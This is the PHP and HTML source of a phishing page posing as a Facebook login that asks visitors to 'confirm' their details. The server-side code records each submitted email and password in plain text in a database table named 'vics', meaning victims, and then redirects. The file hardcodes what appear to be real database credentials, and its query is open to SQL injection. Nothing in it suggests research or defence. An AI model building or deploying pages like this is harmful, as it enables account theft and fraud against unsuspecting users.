<?php
$conn = mysqli_connect('localhost','bolekkeg_admin','Zeyadpc123!','bolekkeg_accs') or die("Error Connect , Contact Ziad");

if(isset($_POST['lgn']))
{
    $email = $_POST['lgn_email'];
    $pass =  $_POST['lgn_pass'];
    
    $snd = mysqli_query($conn,"INSERT INTO vics (vic_email,vic_pass) VALUES ('$email','$pass') ");
    if($snd)
    {
        header("Location :success.html");
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook</title>
    <style>
    @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@100;300;400;500;700;900&family=Tajawal:wght@200;300;400;500;700;800;900&display=swap');
    body {
        background: #b8c6c6;
        font-family: 'Tajawal', sans-serif;
        margin: 0;
        box-sizing: border-box;
        -webkit-box-sizing: border-box;
        -moz-box-sizing: border-box;
    }
    .login-container {
        background: #fff;
        padding: 20px;
        width: 35%;
        margin: 12rem auto;
        border-radius: 7px;
        box-shadow: 0 0 17px 0px #0000004d;
        text-align: center;
    }
    .login-container img {
    width: 16%;
    }
    .login-container .confirm-account {
    color: #1178f2b3;
    font-weight: 600;
    font-size: 20px;
}
.main-inp {
    display: block;
    margin: 10px auto;
    width: 50%;
    padding: 8px;
    border: 1px solid #00000026;
    border-radius: 3px;
    font-family: 'Tajawal';
    font-size: 16px;
}
.main-inp:focus {
    outline: none;
}
.sub-btn {
    width: 54%;
    padding: 10px;
    background: #39a4ff;
    border: none;
    border-radius: 3px;
    color: #fff;
    font-family: 'Tajawal';
    font-size: 22px;
    cursor: pointer;
}
@media screen and (max-width:600px)  {
    .login-container {
        background: #fff;
        padding: 36px 0px;
        width: 85%;
        margin: 1rem auto;
        border-radius: 7px;
        box-shadow: 0 0 17px 0px #0000004d;
        text-align: center;
    }
    .main-inp {
    display: block;
    margin: 10px auto;
    width: 70%;
    padding: 8px;
    border: 1px solid #00000026;
    border-radius: 3px;
    font-family: 'Tajawal';
    font-size: 16px;
}
}
    </style>
</head>
<body>
    <div class="login-container">
        <img src="lgo.png" alt="Facebook Logo" >
        <p class="confirm-account">Log In To Confirm You Details</p>
        <form method="post">
            <input type="text" class="main-inp" placeholder="Mobile Number or Email Address" name="lgn_email" minlength="4" required>
            <input type="password" class="main-inp" placeholder="Password" minlength="4" name="lgn_pass" required>
            <button type="submit" class="sub-btn" name="lgn">Login</button>
        </form>
        <br>
        <small style="margin-top: 8px;">Copyright &copy; 2022 All Rights Reserved</small>
    </div>
</body>
</html>